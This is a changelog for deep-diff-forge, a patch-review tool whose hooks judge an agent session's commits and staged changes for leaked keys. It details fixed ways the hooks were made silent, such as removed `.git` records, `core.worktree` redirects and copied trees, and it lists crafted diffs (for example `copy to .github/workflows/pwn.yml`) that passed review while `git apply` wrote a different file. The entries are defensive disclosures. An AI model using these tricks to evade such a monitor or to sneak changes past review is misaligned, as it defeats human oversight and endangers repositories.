    stop can check it against what the index holds; where it cannot be kept, the stop says
    in how many working trees what is staged may block once more.
  - *An ask that was made is written down (HR9-L-2).* With about three seconds of judging
    left the commit whose turn it was was submitted and answered "no verdict", and the
    stop wrote nothing and said "not asked at this stop for lack of time"; a session
    whose stops all came to their commits like that asked about the same commit every
    time. An ask the judge was run for is written down with its reason whatever time is
    left after it; "not asked" is said only of a commit the judge was not run for.
  - *Two sentences where they belong (HR9-L-3).* What "stands" means for a change that is
    not committed is a line of every message in which something of such a failure stands
    or stands beside what is new, whatever heads it; it was part of the head FAIL STANDS
    alone. A failure that was remembered by its lines and grows past 256 has its new lines
    told apart in the block; it was a plain "FAIL" of all of it.
  - *Stated.* With no birth time, whole-second times and reused inode numbers, a tree
    removed and made again within one second can be taken for the old one, and the same
    failing line in it does not block (README named only the harmless direction). A
    repository with more than 256 working trees: what a stop says, and that it is never
    silent. The sentences for memory that could not be kept: which of them a repository of
    256 working trees or fewer cannot reach.
  - *State.* The schema is still `deep-diff-forge.hook-state.v8`: the entries are the
    same kinds, and a `k` entry can now be a digest, which the build before forgets at the
    next stop that looks (it then says nothing of it: do not go back to that build in the
    middle of a session).

- **Round 18 of Vesper's review and a tenth independent review of the hooks: "not read" is
  not "nothing there"; what is staged stands while the index is untouched; the tree a
  stop is in is the one Git says; no run of the judge takes the time of what is owed
  after it.**
  - *A stop that could not read the tree forgets nothing (HR10-M-1; older).* A working
    tree whose change could not be read (a file that may not be opened, a skip-worktree
    path, a Git that failed or was slow at one stop) came with "no staged change", which
    is the answer "the index was read and holds nothing". The stop forgot what had blocked
    of the staged change, and the staged failure, untouched, blocked a second time at the
    next stop. Everything a stop reads of a working tree now has three answers (nothing
    there, this, not read and why), and only "nothing there" forgets. Such a stop says
    that what has blocked of the staged change stands.
  - *A large staged failure stands whatever the tree does (HR10-M-2; a regression of the
    round before).* A staged failure of more than 256 lines that had blocked, was in the
    working tree again in part, and was repaired there again in part blocked as "Staged
    changes" with the index untouched. A digest that is exactly what the index holds says
    that every staged line has blocked; it was asked only whether the staged change's own
    failure is exactly it. The model test's exception that let this through is narrowed
    to the one case a digest cannot answer: the index is not what the last stop saw.
  - *Working trees inside a bare repository are judged from inside (HR10-M-3; older).* A
    directory under the Git common directory was taken for one of Git's own files. With
    `repo.git/main` and `repo.git/feature`, a stop made from `feature` in a session whose
    project is `main` never judged what was not committed in `feature`, and said of it
    that the session's directory was not in it. Which tree a directory is in is asked of
    Git.
  - *A session that begins with more than 256 working trees judges its tree
    (VD4R18-L-1).* Its start could not list the commits that were there and recorded
    nothing, so every stop was wholly UNJUDGED. The project and its base are recorded
    with the fact that there is no list: the session's commits are UNJUDGED at every
    stop, and what is not committed is judged and blocks.
  - *The sentence for a digest that is given up says what happened (HR10-L-1).* It began
    "This session has more failing lines than the hook keeps one by one (2048)" also in a
    session with one working tree and 300 staged lines of which one file left the index.
    It names its cause, and a second sentence says when what is staged is remembered as a
    whole from now on. Both are reached by runs of the hooks.
  - *The stop's own tree has the time the project's tree does not need (HR10-L-2; a
    regression of the round before).* From a linked tree, time for two runs was held back
    for the project's tree before it was known to have anything to judge: 15 of 35
    seconds for the stop's own change. The project's tree is looked at first (one `git
    status`); clean, nothing is held back for it; with a change, three seconds are. What
    is held back for the asks about commits is what they can need by the session's file
    of judged commits: three seconds when no commit waits for a verdict, thirteen at most.
  - *A judge that hangs on two commits does not keep a third from being asked
    (HR10-L-3; older).* A stop owes three asks at most, the oldest commit never asked
    about among them; each leaves five seconds for each owed ask after it, and thirteen
    seconds of the judging are what all three need. A run that was cut is written down
    as asked, with the time it had.
  - *Smaller.* A refusal of the hooks' own no longer begins "invalid Git selection:". A
    `shallow` file that cannot be read, a `.gitmodules` that cannot be looked at and a
    session directory that cannot be looked at are "not known", not "none".
  - *Tests.* Two tests failed for where they ran, with nothing wrong in what they
    tested. One cut a working tree's name at 140 characters and lost the words it looked
    for under a long temporary directory (the mutation runs of the two rounds before
    ended at their baseline on it, with no mutant tested): the name has 180. The other
    counted the files under `objects` right after a `git commit` of its own, while the
    maintenance process that commit leaves behind still held its lock file (22 of 400 runs
    beside another test suite): the tests' own Git steps start no maintenance.
  - *State.* Schema `deep-diff-forge.hook-state.v9` (the project says whether there is a
    list of the commits that were there); a state of an earlier schema is not read. *New
    in the patch crate:* nothing; the refusal for too many working trees says the number.

- **Round 19 of Vesper's review and an eleventh independent review of the hooks: that a
  directory is one of Git's own is known, not concluded; a look is not a reading.**
  - *A tree Git cannot place is UNJUDGED, never "Git's own files" (HR11-M-1; older).* In a
    bare repository with its trees inside it, any failure of Git for the directory a stop
    was made from was read as "one of Git's own files": a tree pruned while its directory
    was away, with credentials in it, gave a silent stop, and a Git that failed at one stop
    named the tree the session was in as one "the session's directory is not in". A
    directory is Git's own only when that is known without Git: it is inside the Git
    directory and neither it nor any directory between has a `.git` entry. Any other
    failure makes the stop UNJUDGED with Git's words; the tree the directory is under is
    named as one the session's directory may be in, and nothing of it is forgotten.
  - *`git status` saying nothing forgets nothing (HR11-L-2; older).* A stop made from
    another tree took `git status` "clean" for "nothing there" and forgot what had blocked
    in that tree; a file marked assume-unchanged, or a key a clean filter of the
    repository takes out, is in the judge's patch and not in `git status`, so that stop
    printed nothing and the unchanged failure blocked a second time on return. Where
    something of the tree is remembered, it is read the way a stop from inside it reads
    it, and only that reading finding nothing forgets.
  - *Time is held back for commits that still wait (HR11-L-1).* A commit that once had no
    verdict and then passed held five seconds back at every later stop (ten after both
    lanes); the last line of each commit decides, as it does for the asks.
  - *A session directory that is gone is in the tree it was in (HR11-L-5; older).* It is
    asked about at the nearest directory above it that is there.
  - *Sentences.* The reason "The commits of this session: UNJUDGED" in a session with more
    than 256 working trees was cut after "they are not."; it says what follows first, and
    a reason a message cuts ends with "…" (HR11-L-3). The sentence that a digest was given
    up is not said at a stop where everything the index holds is remembered from then on,
    the very block it had warned of (HR11-L-4). A run that had all that was left of the
    stop, or the 30 seconds of one run, says so (HR11-L-6), and three README places say
    what the code does.
  - *Tests.* The two tests that failed for a loaded machine (review V4 round 19) wait for a
    moment on the wall clock counted from the stop's first call of Git, measure what the
    machine took, and make a stop again (a few times at most) only when that stop came to
    its commits without the time the scenario needs; they pass only on stops that asked.
    The mutation run on `07df120`: a test for each missed mutant, or why it is equivalent.
    Two small functions were drawn out of their callers for that (what a tree leaves for
    the project's tree; what the sentences about memory take of a message), and two
    lines of a stop's message are constants of the module.
  - *State.* Schema unchanged (`v9`).

- **Round 20 of Vesper's review (NO-GO) and a twelfth independent review of the hooks
  (GO-WITH-FIXES): what is missing proves nothing.**
  - *A tree whose two records were removed is UNJUDGED, not "Git's own files" (VD4R20-M-1,
    medium).* A directory under the Git directory with no `.git` entry above it was known
    to be Git's own. In a bare repository with its trees inside it, removing a linked
    tree's `.git` file and its administrative directory, its files left in place, made
    that true of the tree the session was in: the next stop from it printed nothing with a
    second credential there, and the failure that had blocked in it was forgotten. A
    directory is Git's own only by where it lies: the Git directory itself or a directory
    under one of the subtrees Git makes there (`objects`, `refs`, `logs`, `reftable`,
    `hooks`, `info`, `worktrees`, `modules`, `branches`, `remotes`, `rr-cache`,
    `lost-found`, `rebase-merge`, `rebase-apply`, `sequencer`, `svn`,
    `fsmonitor--daemon`), with no `.git` entry between. Any other directory Git cannot
    place makes the stop UNJUDGED with Git's words, and a stop that cannot place the
    session's directory forgets nothing because a tree is no longer listed.
  - *A directory that cannot be resolved is still under its tree (HR12-L-4).* Under a
    directory that cannot be searched, the session's directory was "none", and the tree
    it is under was named as one "the session's directory is not in". The path as written
    (its links followed as far as they can be) says which tree it is under: "may be in
    it".
  - *The no-verdict line marks a cut reason (HR12-L-3).* It cut each commit's reason at
    150 characters with no mark; it ends a cut reason with "…", within the same 150.
  - *Stated (HR12-L-1, HR12-L-2).* README and SECURITY say that a tree whose only change
    `git status` does not show, with nothing blocked there, is not named from another
    tree; and that a remembered tree too large to read in its share of the six seconds is
    named "could not be looked at … stands" at each stop from elsewhere, each taking that
    much longer.
  - *Mutation accounting (VD4R20-L-1, HR12-L-5).* Of the 76 mutants the run on `07df120`
    missed, 69 are killed by behaviour and 7 are equivalent: `NAME_MAX - 2` for
    `NAME_MAX + 2` in `TAIL_LINE` was counted killed by an assertion that repeats the
    constant's definition, and the longest counting line (781 characters) fits the
    mutant's 794. That assertion is labelled a definition check.
  - *State.* Schema unchanged (`v9`).

- **Round 21 of Vesper's review (NO-GO) and a thirteenth independent review of the hooks
  (GO-WITH-FIXES): no directory Git cannot place is Git's own.**
  - *A tree under a name Git uses is not Git's own either (VD4R21-M-1, medium; HR13-L-1).*
    `git worktree add` makes a linked tree at `repo.git/hooks/feature`, `repo.git/logs/feat`
    or `repo.git/svn`. With its `.git` file and its administrative directory removed, a
    directory under one of the seventeen names the round before listed was Git's own: the
    stop from that tree printed nothing with a second key in it, and the failure that had
    blocked there was forgotten. Nothing on disk tells such a tree from Git's own files, so
    where a directory lies no longer decides anything: a stop from any directory Git cannot
    place is UNJUDGED with Git's words, and forgets nothing because a tree is no longer
    listed. The list is gone. What follows, and is meant: a stop made from inside a Git
    directory (`.git`, `.git/hooks`, `.git/NOTES_MERGE_WORKTREE`, `.git/lfs`, a bare
    repository's own directory), which was silent when the project was clean, is UNJUDGED
    once for that stop, with a reason that says the session's directory is inside the Git
    directory and Git cannot say which working tree it is in; nothing remembered of any tree
    is forgotten there because it is not listed. No stop is silent because of where its
    directory lies.
  - *Git's words come first (HR13-L-2).* The reason for a directory Git cannot place gave
    the path before Git's words, and a message shows 300 characters of a reason: with a
    long path, "…: fatal: this operation must b…" was all there was to read. Git's words,
    then what follows from them, then the paths. README and SECURITY said that nothing
    remembered of any tree is forgotten at such a stop; a tree the judge's own reading
    finds clean is forgotten there, as at every stop. They say what this entry says: it
    forgets nothing because a tree is no longer listed.
  - *A relative directory is anchored (VD4R21-L-1).* Where the session's directory, given
    as a relative path, could not be resolved (`../linked/locked/sub`, under a directory
    that cannot be searched), the path was kept as written, no tree was under it, and the
    linked tree it names was "the session's directory is not in it". It is taken from the
    hook's own directory, as the system takes it; when that directory cannot be had, every
    tree is one the session's directory may be in.
  - *A `..` after a link steps up from where the link leads (suspected by the thirteenth
    review; reproduced).* An absolute path with `alias/../linked` under a directory that
    cannot be searched was taken out by name: the tree beside `alias` "may" have had the
    session's directory, and the tree it was in on disk was one it was "not in". A `..`
    after a part that cannot be resolved leaves the directory unknown: every tree may be
    the one.
  - *No ceiling (suspected by the thirteenth review; reproduced).* A
    `GIT_CEILING_DIRECTORIES` at a linked tree's top in the session's environment made Git
    say "not a git repository" for a directory in that tree: it was not judged from there,
    and was named as one the session's directory is not in. Every Git call of the hooks has
    the variable empty, which Git reads as no ceiling. The shared hardening list is
    unchanged: the other commands honour a ceiling their caller sets. Not changed:
    `GIT_DISCOVERY_ACROSS_FILESYSTEM`. Set, Git finds a tree across a mount, which is
    right; unset (Git's default), a directory on another file system mounted inside a
    linked tree is in no repository to Git, which README states as a limit.
  - *Tests.* Each finding has a test that fails on `67202b1`: trees at `hooks/feature`,
    `logs/feat` and `svn` with both records removed; a long path under
    `.git/NOTES_MERGE_WORKTREE`; a relative directory under one that cannot be searched; a
    `..` after a link; a ceiling at a linked tree's top. The tests that took a stop from
    Git's directories to be quiet say that it is UNJUDGED, with the project judged.
  - *State.* Schema unchanged (`v9`).

- **Round 22 of Vesper's review (NO-GO) and a fourteenth independent review of the hooks
  (GO-WITH-FIXES): four rules in place of special cases.** Every finding since round 19 had
  one shape: the hook believed an answer about where the session's directory is (from Git,
  from the path, from the listing of working trees) and forgot, or said nothing.
  - *Where the session is, is found one way, first (VD4R22-M-1, medium).* A relative
    directory that was removed (`../linked/build/gone`) was "nothing there" before it was
    anchored: the linked tree it was under was not judged and was named as one the
    session's directory is not in; with that tree's two records removed as well, the stop
    printed nothing and forgot what had blocked there. One function now anchors a relative
    path at the hook's own directory and walks the path up to its nearest directory that
    is there, as for an absolute one, passing a part that names a file (a `cwd` that named a
    file was "gone": suspected by the fourteenth review). The hook's own directory that
    cannot be had, or a part that cannot be looked at, makes the stop UNJUDGED, every tree
    it may be in named so.
  - *Git's answer must hold the session's directory (HR14-L-4).* A `core.worktree` in a
    linked tree's own configuration pointed at the project made Git say the tree was the
    project: the stop from it printed nothing with a second key in it, and what had blocked
    there was forgotten, also at a stop from the project, whose reading of the tree read the
    project. Where Git names a tree that does not contain the directory, the stop is
    UNJUDGED ("Git names as the working tree a directory that does not contain the
    session's directory"); what is read of another tree is that tree's only when Git names
    it there.
  - *A file-system boundary across a linked tree is not "no repository" (HR14-L-3).* A btrfs
    subvolume made inside a linked tree (one unprivileged command), or a mount, made Git
    stop at the boundary: the tree was named as one the session's directory is not in.
    Where the mount point Git names lies at or under a linked tree's top, the stop is
    UNJUDGED with Git's words and that tree may be the one. Where none does, it is "no
    repository" as before: on this kind of host `/var` is a mount point, and every directory
    under it that is in no repository carries Git's boundary words.
    `GIT_DISCOVERY_ACROSS_FILESYSTEM` is still left as the session has it.
  - *A ceiling hides nothing of the project, and nothing else is shown (HR14-L-1).* Round 22
    emptied `GIT_CEILING_DIRECTORIES` for every Git call, and a repository the user hides
    with a ceiling (a home directory's) was found: a session below it took it for its
    project, with an UNJUDGED line at each stop and a second's read of the whole home at
    each tool call. The project is found with the caller's ceiling as it is; once it is
    known, the caller's ceiling is kept without the entries at or under one of the project's
    trees (main and linked, compared as they are on disk). A ceiling inside a tree still
    does not hide it. What follows, and is meant: a session that begins below a ceiling
    that hides its repository has no project, as before round 22.
  - *What blocked in a tree is not forgotten while its directory stands (HR14-L-2; Vesper's
    case 2).* A linked tree beside the project whose two records were removed, or whose
    `.git` file was removed and then `git worktree prune` run, is placed by Git in no
    repository: the stop from inside it printed nothing with a second key there, and the
    tree was forgotten because it was no longer listed. A tree that is no longer listed and
    whose directory stands is now named at every stop ("… is no longer a working tree of
    this repository; what blocked there stands until the directory is gone or it is a tree
    again"), and a stop from inside it is UNJUDGED. It is forgotten when its directory is
    gone, or when it is a tree again and the judge's own reading finds that tree clean; a
    directory that cannot be looked at keeps it, named so.
  - *Tests.* Each finding has a test that fails on `8959ca8`: the relative directory that
    was removed, with the tree whole and with its records removed; a `cwd` that names a
    file; `core.worktree` pointed at the project; a file system mounted in a linked tree (in
    a user and mount namespace of the test's own, passed where none can be made); a
    repository hidden by a ceiling; a tree with both records removed and one pruned, then
    its directory removed, and one made a tree again; a `v9` state read and written anew.
  - *State.* Schema `deep-diff-forge.hook-state.v10`: it records the top level of each
    linked tree it remembers a failure of (`trees`), which is how a tree no longer listed is
    known to be gone. A `v9` state is read with no tree recorded and written back as `v10`
    (refusing it would make every stop of a session running across the upgrade UNJUDGED);
    its trees no longer listed are forgotten as before. A path that is not UTF-8 or is
    longer than 16 KiB, and the paths past 256 KiB in all, are not recorded.

- **Round 23 of Vesper's review (NO-GO) and a fifteenth independent review of the hooks
  (GO-WITH-FIXES): containment is not identity.** Round 23's rule "Git's answer must hold
  the session's directory" checked that the top Git names contains the directory, not that
  the top and the Git directory Git names are one tree.
  - *Git's answer is believed only as a pair that names one tree (VD4R23-M-1, medium;
    HR15-L-1 and HR15-L-2, low).* Two genuine linked trees, the inner one inside the outer
    one, the inner tree's own `core.worktree` naming the outer tree: Git named the outer
    top (it holds the session's directory) with the inner tree's Git directory, the clean
    outer tree was judged under the inner tree's name, what had blocked in the inner tree
    was forgotten, and the next stop printed nothing with two keys in it. The same with
    `core.worktree` naming a subdirectory of the tree that holds a clean copy of its
    files; and a copy of a linked tree made with `cp -a` and cleaned was judged as that
    tree, which then blocked a second time for the same failure. Now the top Git names
    must be the one the Git directory it names records: a linked tree's `gitdir` file (its
    path less `/.git`), the main tree's top as `git worktree list` gives it (the directory
    of a main Git directory named `.git`; where the Git directory was made apart and
    records no top, the project's top when the session began in the main tree). A pair
    that is not one tree makes the stop UNJUDGED ("Git names … as the working tree of a
    Git directory whose records name … as that tree", the two trees first so that a cut
    for room keeps them, the Git directory's path after them); nothing of either tree is
    forgotten, and neither directory is judged as that tree at that stop. That the top
    contains the session's directory is still asked after it. What follows, and is meant:
    a stop from a copy of a linked tree is UNJUDGED (it was judged as the tree, and a copy
    with the tree's failure in it stood as that failure); a session that begins in such a
    copy, or in a tree so redirected, is told why at its start, and its stops are
    UNJUDGED; a session that began in a linked tree of a repository whose Git directory
    was made apart is UNJUDGED at a stop from the main tree; and a stop from a linked tree
    moved with a plain `mv` and not repaired is UNJUDGED (its `gitdir` names where it was;
    `git worktree repair` in it records where it is).
  - *What is read of every listed tree counts as its own only when Git names that tree
    there (HR15-L-1).* That was asked only where a failure stood and the reading found
    nothing, so a tree Git is pointed away from was read through the redirect elsewhere,
    and once forgotten was never named again. Now every other tree a stop looks at is
    asked, with the pair rule: one `git rev-parse` more for each, at most sixteen a stop,
    each in the tree's share of the six seconds for looking. A tree Git does not name
    there is "could not be looked at", with the reason, and nothing of it is forgotten.
  - *A `v9` state is written as `v10` by the first hook that reads it (VD4R23-L-1, low).*
    A clean `v9` state was read and, nothing changed, left as `v9`: the state read is the
    same whether it came from `v9` or `v10`. Whether the file was `v9` is kept beside it,
    and the first stop (or session start) that keeps the state writes it as `v10`.
  - *A ceiling entry is compared in its resolved form (a note of the fifteenth review).*
    An entry written through the project's path (`repo/../hidden`, which is the repository
    `hidden` beside it) was compared as written, started with the project's path, and was
    left out: the repository it hides was found. Entries are compared with their `..` and
    their links resolved, `..` by name where the part before it is not there.
  - *Words (the fifteenth review).* README, SECURITY and this file now say that a stop
    made from a submodule's Git directory (`.git/modules/<name>`) is UNJUDGED: Git names
    the submodule's working tree there, which does not contain the session's directory.
    Its reason says so and now adds that the directory is inside the Git directory.
    README's "inside the Git directory … Git cannot say which working tree it is in" is
    the reason of a stop from `.git`, `.git/hooks` and the like, as it says; the round-23
    sentences on `core.worktree` are the pair rule's.
  - *Tests.* Each finding has a test that fails on `c9a2ece`: two nested linked trees, the
    inner one pointed at the outer one; a tree pointed at a clean copy inside itself; a
    copy of a linked tree, cleaned; a copy of a project whose Git directory was made apart;
    a clean `v9` state; a ceiling written `repo/../hidden` (an integration test and an
    entry of the ceiling's unit table). The pair rule has a unit table of its own (main,
    linked, linked pointed at the main tree, at an outer tree, at a subdirectory, a copy, a
    `gitdir` missing or unreadable, a Git directory made apart), on functions `c9a2ece`
    does not have. The round-23 test of `core.worktree` pointed at the project now reads
    the pair rule's words.
  - *State.* Schema unchanged (`v10`).

- **Round 24 of Vesper's review (NO-GO) and a sixteenth independent review of the hooks
  (NO-GO): one tree identity moved onto another directory.** The last build round of this
  line. Both reviews found one medium each; the class (VD4R23-M-1, HR15-L-1, HR15-L-2
  before) is closed where the hook can see it cheaply and stated as a limit otherwise.
  - *A tree does not move while the directory it is remembered at stands (VD4R24-M-1,
    medium; HR16-L-3, low).* Two nested linked trees, the inner tree's `core.worktree` set
    to the outer one and its administrative `gitdir` record edited to name the outer tree's
    `.git`: Git and the records named the outer tree as the inner one, the clean outer tree
    was judged under the inner tree's name, what had blocked in the inner tree was
    forgotten, and the next stops printed nothing with two keys in it. The same after
    `cp -a` of a linked tree, `git clean` and `git worktree repair` run in the copy. The
    state already records the top of every tree something has blocked in: where a tree is
    now paired, by any route, with another top than the recorded one and the recorded
    directory still stands (or cannot be looked at), neither directory is read as that
    tree. A stop from it is UNJUDGED ("Git names … as the working tree that this session's
    memory has at …, which still stands"), a stop from elsewhere names it, nothing is
    forgotten, and the recorded top is kept, until `git worktree repair` is run in the
    directory that stands or it is removed. Where the recorded directory is gone, the tree
    is read at its new top as before (a tree moved and repaired, `git worktree move`).
  - *What is not a listed tree is not taken for one (HR16-M-1, medium).* A copy of a linked
    tree made inside the project (`cp -a ../feature feature-copy`) with a key in it: every
    stop from the project printed nothing, because a directory Git places in this
    repository with a Git directory whose records name another directory was taken for a
    working tree named by the rule for working trees, which names only listed trees. It is
    named as left out, at every stop ("… is no working tree of this project by the
    repository's records (Git names …)").
  - *A listed tree is left out as judged by which tree it is, not by its path (HR16-L-1,
    low).* With one tree's `gitdir` record edited to name another tree's `.git`, Git lists
    the other path twice; a stop from that tree left both entries out by their path, and the
    first tree's failure was neither looked at nor said. Two entries with one path are now
    two trees, each taking an administrative directory no entry before it took.
  - *Words (HR16-L-2, low, and the sixteenth review's notes; no code).* README and
    SECURITY now say that a main Git directory named `.git` that does not lie at the tree's
    top (`--separate-git-dir=…/.git`, or a `.git` link) makes every stop from the main tree
    UNJUDGED; SECURITY's main-tree pair sentence names both layouts. A stop from a tree
    moved with `mv` and not repaired says that `git worktree repair` run in it records where
    it is; the note of a gone tree no longer says that `git worktree prune` forgets a main
    Git directory listed as the main tree.
  - *A stated limit.* SECURITY's "Not a boundary" says that an agent that edits Git's own
    administrative files (`gitdir`, `commondir`, `core.worktree`) can make one tree be read
    as another; the hooks make this visible where a remembered directory still stands, and
    otherwise it is a stated limit, as editing the state file is.
  - *Tests.* Each finding has a test that fails on `7380e8e`: the two nested trees with
    both records moved; a copy repaired onto; a copy inside the project; two listed entries
    with one path; and a tree moved by hand, unjudged with the remedy until repaired, then
    standing (the remedy's words are new). A unit table for the recorded directory
    (standing, gone, a file, unreadable, not recorded; the new top the same or another) and
    two listed entries with one path, on functions `7380e8e` does not have.
  - *State.* Schema unchanged (`v10`).

- **The closing fix of the hooks line: Vesper's round 25 (GO) and a seventeenth independent
  review of the hooks (NO-GO).**
  - *The tree stands at its recorded directory only where that directory is the tree
    (HR17-M-1, medium).* Round 25 took any directory at the recorded path for the tree
    standing there: after `git worktree move`, a new tree, a clone or a build directory made
    at the old path left the moved tree UNJUDGED at every stop, a new key in it never
    blocked, and the remedy the stop named changed nothing. The recorded directory now
    counts only when its `.git` file names the tree's own administrative directory, or when
    it cannot be read; otherwise the tree is read at its new top, its failure stands and a
    new one blocks. VD4R24-M-1 and HR16-L-3 stay UNJUDGED with nothing forgotten (their old
    directory still names the tree).
  - *Words and stated limits (HR17-L-1, HR17-L-2, low).* The remedy for a tree moved with
    `mv` is said only where the directory it was moved from is gone: run in a copy, the
    repair makes the copy the tree and the directory copied no tree of the project, which
    is now a stated limit. The note of a gone tree in which a failure stands no longer
    advises `git worktree prune` (it would forget what blocked there) but repair where a
    tree moved with `mv` is now; a tree whose entry Git ends after `mv` (prune, or
    `git worktree add -f` at its old path) is a stated limit. SECURITY's "Not a boundary"
    adds a tree's `.git` file to the files of Git's that an agent can edit.
  - *A test that is sensitive to load (HR17-L-3; no code).*
    `a_repository_with_more_working_trees_than_are_read_says_so` can fail under heavy
    parallel load: the session start's 8 seconds over the reflogs of 256 trees run out, and
    the session gets the words of one with no list of commits (the same on `7380e8e`).
  - *Tests.* Each fails on `38af7b8`: a tree moved with `git worktree move` and a new tree,
    a clone or a build directory made at its old path; two trees swapped; a new failure in
    the moved tree before and after its commit. The unit table has rows for a recorded
    directory with no `.git`, with a `.git` that names another tree's directory, with a
    `.git` that is a directory, and with a `.git` that cannot be read.
  - *State.* Schema unchanged (`v10`).

### Changed

- Path and shape weights are stated once, in `RiskSignal::weight`, and the scorer reads
  them there. No score changes: the ranking of every input is the same as before.

## [0.8.3] - 2026-11-11

Tagged `v0.8.3` at `a74bf91` (2026-11-11 UTC), signed.

**Security release** ([GHSA-rq5r-p3g9-phff](https://github.com/Louranicas/deep-diff-forge/security/advisories/GHSA-rq5r-p3g9-phff)). v0.8.2 and earlier could review a
change on a different file, or with a different mode or type, than `git apply` writes: a
name left behind by a `diff --git` line that a binary line follows directly, a new file's
mode overridden by a `new mode` line (independent rescore of v0.8.2, F3 high, F2 medium),
and content under a mode Git reads as a submodule (found while the fix was reviewed, high).
Upgrade from 0.8.2; the changes are fixes and three dependency updates, and no interface
changes. Three findings of the same rescore are not fixed here and are listed under Known
limits.

### Security

- **No name carries over from a `diff --git` line Git reads no patch from** (independent
  rescore of v0.8.2, F3, high). A `diff --git` line with no extended header after it is no
  header to Git, so `Binary files … differ` or `GIT binary patch` straight after it is no
  patch. But the line has already given Git's patch its names, and they stay for the next
  section that has no `---`/`+++` or move names of its own. `diff --git a/first b/first`,
  `Binary files a/first and b/first differ`, then `diff --git a/second b/second` with an
  `index` line and a hunk was reviewed as a binary change to `first` and a text change to
  `second` (exit 0), while `git apply` wrote the hunk to `first` and left `second` alone.
  Measured on v0.8.2 with Git 2.56. A binary line straight after `diff --git` is now refused
  (exit 4); Git writes an `index` line before it.
- **A created or deleted file's mode is not overridden by `old mode` or `new mode`** (rescore
  F2, medium). `new file mode` and `new mode` set the same mode in Git and the later line
  wins, so `new file mode 100644` followed by `new mode 120000` created a symlink, and
  `new mode 100755` an executable, where the review showed a plain new file with both lines
  in its metadata. `new file mode` or `deleted file mode` beside `old mode` or `new mode` is
  refused, in either order. Git never writes the pair.
- **A mode Git reads as a submodule cannot carry content** (found while this fix was
  reviewed; high). Git reads a mode with no file-type bits as a submodule (`canon_mode`), and
  for a submodule it makes or removes a directory and writes nothing from the hunks.
  `new file mode 644` (or `755`, `0`, `140000`) with a hunk, and `new file mode 160000` with
  a hunk of ordinary content, were reviewed as a new file holding that content, while
  `git apply` created an empty directory. A binary body under `160000` was shown as a binary
  change and written as an empty directory too. Measured on v0.8.2 with Git 2.56. A mode on
  a mode header or an `index` line must now have the type of a regular file, a symlink or a
  submodule. Under a submodule mode every hunk line must be Git's own
  `Subproject commit <id>`, and a binary line or body is refused.

### Fixed

- **The Git differential puts one section's leftovers in front of another.** Its generated
  cases were single sections, so a name left by an earlier line was never in play. A bare
  `diff --git` line, one of 23 lines (the extended headers, header breaks and binary body
  lines), then each of five sections (115 cases) is now compared with `git apply`, beside the
  findings themselves. Its summary comparison now includes the mode a file is created or
  deleted with, which it dropped before: a symlink or an executable is created by its mode
  alone. Control: the new tests fail on the v0.8.2 parser.
- Twelve test fixtures in eleven files used `diff --git` followed directly by `Binary files …
  differ` as "a binary file". They now have the `index` line Git writes.

### Dependencies

- **unicode-width 0.2.3, rustix 1.1.6 and signal-hook 0.4.6** (Dependabot #112, applied as
  #120 with `fuzz/Cargo.lock` and the SBOM in step; the fuzz lock's rustix moves from 1.1.4
  to 1.1.6 too). Read from the crates' sources, not measured:
  - unicode-width 0.2.3 gives U+FF9E and U+FF9F (the halfwidth katakana voiced and
    semi-voiced sound marks) width 1, where 0.2.2 gave 0, and moves its tables to Unicode 18.
    Padding and wrap points change for text with those two characters; no DDF test or fixture
    has them. unicode-segmentation stays at 1.13.3 (Unicode 17).
  - rustix 1.1.6 carries the fix for GHSA-jh2m-fhpj-3vr7 (RUSTSEC-2026-0486: extended-attribute
    calls, 1.0.0 to 1.1.5). DDF calls none of them, so no DDF release was affected; the
    advisory entered the RustSec database on 2026-11-11, and from then the supply chain gate
    of CI and of the release workflow refuses a lock file with rustix 1.0.0 to 1.1.5 (the
    root lock had 1.1.5, the fuzz lock 1.1.4). That is why a security release carries dependency
    updates.
  - signal-hook 0.4 changes `low_level::pipe`, which DDF does not use; the daemon's
    `iterator` use is unchanged. The TUI's crossterm still brings signal-hook 0.3.18, so the
    CLI links both, over one signal-hook-registry.

### Known limits (from the same rescore; not fixed here)

- **A binary body Git finds corrupt (F1, medium).** Git checks a `GIT binary patch` body by
  inflating it; DDF checks its line grammar only. When the body does not inflate, Git prints
  an error, applies the sections before it, drops that section and every later one, and
  exits 0, while DDF shows them all as changed. Nothing unreviewed is written, but reviewed
  changes do not land.
- A mail-format patch whose message has a line beginning `-` or `+` is refused though Git
  applies it (F4), and `--layout inline` does not show modes, symlinks or a rename's source
  (F5).

## [0.8.2] - 2026-11-09

Tagged `v0.8.2` at `fb5ffe1` (2026-11-10), signed.

**Security release** ([GHSA-gp5v-m67f-gmgp](https://github.com/Louranicas/deep-diff-forge/security/advisories/GHSA-gp5v-m67f-gmgp)). v0.8.1 and earlier could
review a different file or mode than `git apply` writes: a copy under a name other than its
`copy to`, a Git section whose `---`/`+++` name `-p1` leaves nothing of, repeated mode
headers (independent rescore of v0.8.1, N1 and N2 high, N3 medium), a copy, rename or mode
line after a binary line, and a move name with a carriage return in it (rescore of the
untagged 0.8.2, F1 high, F2 medium). Upgrade from 0.8.1; every change below is a fix, and no
interface changes.

### Security

- **A copy's reviewed destination is the one Git writes** (independent rescore of v0.8.1, N1,
  high). Git takes a copy's new path from its last `copy to` line; DDF never read that line and
  reviewed the `diff --git` or `+++` name instead. `diff --git a/README.md b/docs/README-copy.md`
  with `copy to .github/workflows/pwn.yml` and a hunk was reviewed as a docs copy (exit 0, CLI,
  `rpc` and MCP `review_outline`) while `git apply` wrote the workflow with the hunk's content.
  Present since `copy` headers were first read; measured on v0.8.0 and v0.8.1 with Git 2.56.
  The last `copy to` is now the reviewed path, as Git reads it.
- **A Git section's `---`/`+++` name that `-p1` leaves nothing of is refused** (rescore N2,
  high). Git reads `--- README` as no name and keeps the `diff --git` one, so
  `diff --git a/.github/workflows/ci.yml …` with `--- README` / `+++ README` changed the
  workflow while DDF reviewed `README`. No tool writes this form; it is refused (exit 4).
- **A binary line ends a Git section's header** (independent rescore of `af5c3d1`, the
  untagged 0.8.2, F1, high). Git stops reading extended headers at `Binary files … differ` and
  `GIT binary patch`, and its patch for the section ends there. DDF read on, so
  `diff --git a/.github/workflows/ci.yml …` with an `index` line, `Binary files … differ`, then
  `copy from docs/logo.png` / `copy to docs/logo-copy.png` was reviewed as a binary copy of a
  logo (exit 0, CLI and MCP `review_outline`) while `git apply` rewrote the workflow from the
  `index` line's blob, which only has to be in the object database. A `rename` after the binary
  line did the same in v0.8.1; the N1 fix above made the copy form hide the workflow path too.
  A header, `---`/`+++` or hunk after a binary line is now refused, as are `GIT binary patch`
  with trailing text, `Binary files` without `differ`, and a `GIT binary patch` with no
